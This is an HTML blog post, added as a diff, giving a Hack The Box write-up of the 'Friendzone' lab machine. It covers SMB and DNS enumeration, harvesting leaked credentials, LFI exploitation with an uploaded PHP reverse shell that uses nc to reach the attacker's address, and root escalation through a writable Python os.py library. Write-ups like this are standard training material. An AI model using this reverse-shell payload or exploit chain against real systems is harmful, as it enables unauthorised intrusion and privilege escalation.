@@ -1,0 +1,244 @@
+<hr />
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today Friendzone retired and here’s my write-up about it. Friendzone was a very nice and easy box. I enjoyed solving it and I really liked it, it had a lot of funny parts as well. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.123</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">friendzone.htb</code>. Let’s jump right in !
+<img src="/images/hackthebox/friendzone/0.png" alt="" /></p>
+<hr />
+
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
+<code class="highlighter-rouge">nmap -sV -sT friendzone.htb</code>
+<img src="/images/hackthebox/friendzone/1.png" alt="" />
+<br /> Note : I didn’t do a script scan (<code class="highlighter-rouge">-sC</code>) because for some reason it took a lot of time and didn’t finish.
+<br /> We got <code class="highlighter-rouge">ftp</code> on port 21, <code class="highlighter-rouge">ssh</code> on port 22, <code class="highlighter-rouge">dns</code> on port 53, <code class="highlighter-rouge">http</code> on port 80, <code class="highlighter-rouge">https</code> on port 443 and <code class="highlighter-rouge">smb</code>. Unfortunately anonymous login wasn’t allowed on <code class="highlighter-rouge">ftp</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/friendzone# ftp friendzone.htb 
+Connected to friendzone.htb.
+220 (vsFTPd 3.0.3)
+Name (friendzone.htb:root): anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+ftp&gt; 
+</code></pre></div></div>
+<p><br /> Let’s check <code class="highlighter-rouge">smb</code>.
+<br /></p>
+<hr />
+
+<h2 id="smb">SMB</h2>
+<p><br /> I used <code class="highlighter-rouge">smbclient</code> to list the shares :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/friendzone# smbclient --list friendzone.htb -U ""
+Enter WORKGROUP\'s password:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        Files           Disk      FriendZone Samba Server Files /etc/Files
+        general         Disk      FriendZone Samba Server Files
+        Development     Disk      FriendZone Samba Server Files
+        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            FRIENDZONE
+</code></pre></div></div>
+<p><br /> I also used <code class="highlighter-rouge">smbmap</code> to know what permissions do I have : <code class="highlighter-rouge">smbmap -H friendzone.htb</code>.  I found that I had read access to <code class="highlighter-rouge">general</code> and read/write access to <code class="highlighter-rouge">Development</code>. I also noticed that the comment of the share <code class="highlighter-rouge">Files</code> discloses the path of that share : <code class="highlighter-rouge">/etc/Files</code>, so we can assume that all shares are in <code class="highlighter-rouge">/etc</code>.
+<br /> In <code class="highlighter-rouge">general</code> I found a file called <code class="highlighter-rouge">creds.txt</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/general -U ""
+Enter WORKGROUP\'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed Jan 16 22:10:51 2019
+  ..                                  D        0  Wed Jan 23 23:51:02 2019
+  creds.txt                           N       57  Wed Oct 10 01:52:42 2018
+
+                9221460 blocks of size 1024. 6434016 blocks available
+smb: \&gt; get creds.txt 
+getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \&gt; 
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/friendzone# cat creds.txt 
+creds for the admin THING:
+
+admin:WORKWORKHhallelujah@#
+</code></pre></div></div>
+<p><br /> So we have credentials but we don’t know where to use them, it says <code class="highlighter-rouge">creds for the admin THING</code>, so let’s keep enumerating until we find that admin thing.
+<br /> <code class="highlighter-rouge">Development</code> was just empty :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U ""
+Enter WORKGROUP\'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Fri Jul 12 13:17:50 2019
+  ..                                  D        0  Wed Jan 23 23:51:02 2019
+</code></pre></div></div>
+<p><br /> But since we have write access to that share and we know its path : <code class="highlighter-rouge">/etc/Development</code> then that share can help us later if we have a an <code class="highlighter-rouge">LFI</code> or a similar vulnerability.
+<br /></p>
+<hr />
+
+<h2 id="http-and-dns">HTTP and DNS</h2>
+<p><br /> <code class="highlighter-rouge">http://friendzone.htb</code> :
+<img src="/images/hackthebox/friendzone/2.png" alt="" />
+<br /> A static page, not really interesting, I noticed that email at the bottom : <code class="highlighter-rouge">info@friendzoneportal.red</code> so I added <code class="highlighter-rouge">friendzoneportal.red</code> to <code class="highlighter-rouge">/etc/hosts</code> :
+<img src="/images/hackthebox/friendzone/3.png" alt="" />
+<br /> But <code class="highlighter-rouge">http://friendzoneportal.red</code> was just the same thing :
+<img src="/images/hackthebox/friendzone/4.png" alt="" />
+<br /> I went back and added <code class="highlighter-rouge">friendzone.red</code> to the hosts file :
+<img src="/images/hackthebox/friendzone/5.png" alt="" />
+<br /> But it was also the same thing. Then I remembered that there’s a <code class="highlighter-rouge">dns</code> server so I used dig :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/friendzone# dig axfr friendzone.red @10.10.10.123
+
+; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-3-Debian &lt;&lt;&gt;&gt; axfr friendzone.red @10.10.10.123
+;; global options: +cmd
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.         604800  IN      AAAA    ::1
+friendzone.red.         604800  IN      NS      localhost.
+friendzone.red.         604800  IN      A       127.0.0.1
+administrator1.friendzone.red. 604800 IN A      127.0.0.1
+hr.friendzone.red.      604800  IN      A       127.0.0.1
+uploads.friendzone.red. 604800  IN      A       127.0.0.1
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 402 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Fri Jul 12 13:22:51 EET 2019
+;; XFR size: 8 records (messages 1, bytes 289)
+</code></pre></div></div>
+<p><br /> now we have : <code class="highlighter-rouge">administrator1.friendzone.red</code>, <code class="highlighter-rouge">hr.friendzone.red</code> and <code class="highlighter-rouge">uploads.friendzone.red</code>. I edited the hosts file again :
+<img src="/images/hackthebox/friendzone/6.png" alt="" />
+<br /> But I still got the same thing, I ran <code class="highlighter-rouge">gobuster</code> and got <code class="highlighter-rouge">/wordpress</code> which was empty :
+<img src="/images/hackthebox/friendzone/7.png" alt="" />
+<br /> And <code class="highlighter-rouge">robots.txt</code> which wasn’t a real <code class="highlighter-rouge">robots.txt</code> file :D
+<img src="/images/hackthebox/friendzone/8.png" alt="" />
+<br /> There was another <code class="highlighter-rouge">https</code> port so I tried that.
+<br /> <code class="highlighter-rouge">https://friendzone.red</code> :
+<img src="/images/hackthebox/friendzone/9.png" alt="" />
+<br /> <code class="highlighter-rouge">https://administrator1.friendzone.red</code> :
+<img src="/images/hackthebox/friendzone/10.png" alt="" />
+<br /> So this is the “administrator thing” let’s try the credentials we have :
+<img src="/images/hackthebox/friendzone/11.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/friendzone/12.png" alt="" />
+<br /> Great. <code class="highlighter-rouge">/dashboard.php</code> :
+<img src="/images/hackthebox/friendzone/13.png" alt="" /></p>
+<hr />
+
+<h2 id="lfi-in-dashboardphp-user-flag">LFI in dashboard.php, User Flag</h2>
+<p><br /> As you can see it’s complaining about missing parameters, by looking at the example : <code class="highlighter-rouge">image_id=a.jpg&amp;pagename=timestamp</code> my first guess was that <code class="highlighter-rouge">dashboard.php</code> includes the <code class="highlighter-rouge">php</code> file provided in the <code class="highlighter-rouge">pagename</code> parameter. So if we give it <code class="highlighter-rouge">test</code> it will append <code class="highlighter-rouge">.php</code> to <code class="highlighter-rouge">test</code> then include that file. We can upload files to the <code class="highlighter-rouge">smb</code> share <code class="highlighter-rouge">Development</code> and we also know the full path : <code class="highlighter-rouge">/etc/Development</code>, so if it’s really vulnerable to <code class="highlighter-rouge">LFI</code> we can get a reverse shell easily. I wrote a small <code class="highlighter-rouge">php</code> script to get a reverse shell :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f');
+?&gt;
+</code></pre></div></div>
+<p><br /> Then I uploaded it to <code class="highlighter-rouge">Development</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U ""
+Enter WORKGROUP\'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; put rev.php 
+putting file rev.php as \rev.php (0.3 kb/s) (average 0.3 kb/s)
+smb: \&gt; 
+</code></pre></div></div>
+<p><br /> And finally I tested my idea :
+<code class="highlighter-rouge">https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&amp;pagename=/etc/Development/rev</code>
+<img src="/images/hackthebox/friendzone/14.png" alt="" />
+<br /> It worked and now we have a reverse shell as <code class="highlighter-rouge">www-data</code> :
+<img src="/images/hackthebox/friendzone/15.png" alt="" />
+<br /> We owned user.
+<br /></p>
+<hr />
+
+<h2 id="ssh-as-friend-privilege-escalation">SSH as friend, Privilege Escalation</h2>
+<p><br /> I looked into <code class="highlighter-rouge">/var/www</code> and found a file called <code class="highlighter-rouge">mysql_data.conf</code> which had some credentials :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la
+total 36
+drwxr-xr-x  8 root root 4096 Oct  6  2018 .
+drwxr-xr-x 12 root root 4096 Oct  6  2018 ..
+drwxr-xr-x  3 root root 4096 Jan 16 22:13 admin
+drwxr-xr-x  4 root root 4096 Oct  6  2018 friendzone
+drwxr-xr-x  2 root root 4096 Oct  6  2018 friendzoneportal
+drwxr-xr-x  2 root root 4096 Jan 15 21:08 friendzoneportaladmin
+drwxr-xr-x  3 root root 4096 Oct  6  2018 html
+-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf
+drwxr-xr-x  3 root root 4096 Oct  6  2018 uploads
+$ cat mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+$
+</code></pre></div></div>
+<p><br /> I could get <code class="highlighter-rouge">ssh</code> access as friend with them :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/friendzone# ssh friend@friendzone.htb
+The authenticity of host 'friendzone.htb (10.10.10.123)' can't be established.
+ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'friendzone.htb,10.10.10.123' (ECDSA) to the list of known hosts.
+friend@friendzone.htb's password:
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                                                                             
+
+You have mail.
+Last login: Fri Jul 12 14:26:57 2019 from 10.10.13.142
+friend@FriendZone:~$ 
+</code></pre></div></div>
+<p><br /> I did the regular enumeration and I ran <a href="https://github.com/DominicBreuker/pspy"><code class="highlighter-rouge">pspy</code></a> to monitor the processes to see if there’s something that can be exploited :
+<img src="/images/hackthebox/friendzone/16.png" alt="" />
+<br /> After some time I saw this :
+<img src="/images/hackthebox/friendzone/17.png" alt="" />
+<br /> Root runs <code class="highlighter-rouge">/opt/server_admin/reporter.py</code>  from time to time.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/opt/server_admin$ cat reporter.py 
+#!/usr/bin/python
+
+import os
+
+to_address = "admin1@friendzone.com"
+from_address = "admin2@friendzone.com"
+
+print "[+] Trying to send email to %s"%to_address
+
+#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+</code></pre></div></div>
+<p><br /> So if we can write to that script then we can get a shell as root. Unfortunately we can’t :
+<img src="/images/hackthebox/friendzone/18.png" alt="" />
+<br /> But I noticed that it’s importing the <code class="highlighter-rouge">os</code> library. Usually python libraries are only writable by root, but I checked <code class="highlighter-rouge">os.py</code> and friend had permissions to write to it :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os
+-rwxr-xr-x  1 root   root     4635 Apr 16  2018 os2emxpath.py
+-rwxr-xr-x  1 root   root     4507 Oct  6  2018 os2emxpath.pyc
+-rw-rw-r--  1 friend friend    476 Jul 12 14:39 os.py
+-rw-r--r--  1 root   root     1187 Jul 12 14:40 os.pyc
+-rwxr-xr-x  1 root   root    19100 Apr 16  2018 _osx_support.py
+-rwxr-xr-x  1 root   root    11720 Oct  6  2018 _osx_support.pyc
+-rwxr-xr-x  1 root   root     8003 Apr 16  2018 posixfile.py
+-rwxr-xr-x  1 root   root     7628 Oct  6  2018 posixfile.pyc
+-rwxr-xr-x  1 root   root    13935 Apr 16  2018 posixpath.py
+-rwxr-xr-x  1 root   root    11385 Oct  6  2018 posixpath.pyc
+</code></pre></div></div>
+<p><br /> So I just put those two lines at the bottom of <code class="highlighter-rouge">os.py</code> :
+<img src="/images/hackthebox/friendzone/19.png" alt="" />
+<br /> And after a minute I got a shell :
+<img src="/images/hackthebox/friendzone/20.png" alt="" />
+<br /> And we owned root !
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/hackback/">Hack The Box - Hackback</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/ctf/">Hack The Box - CTF</a></p>
+<hr />
+
